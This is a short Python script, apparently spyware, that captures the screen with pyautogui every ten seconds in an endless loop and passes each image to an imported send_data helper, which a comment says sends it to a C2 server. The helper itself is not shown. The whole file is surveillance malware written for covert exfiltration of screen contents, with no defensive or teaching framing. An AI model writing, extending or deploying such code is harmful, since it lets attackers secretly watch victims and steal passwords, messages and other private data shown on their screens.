import pyautogui
import time
from utils import send_data

def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    send_data("screenshot.png")  # Send screenshot to C2 server

if __name__ == "__main__":
    while True:
        take_screenshot()
        time.sleep(10)  # Take a screenshot every 10 seconds
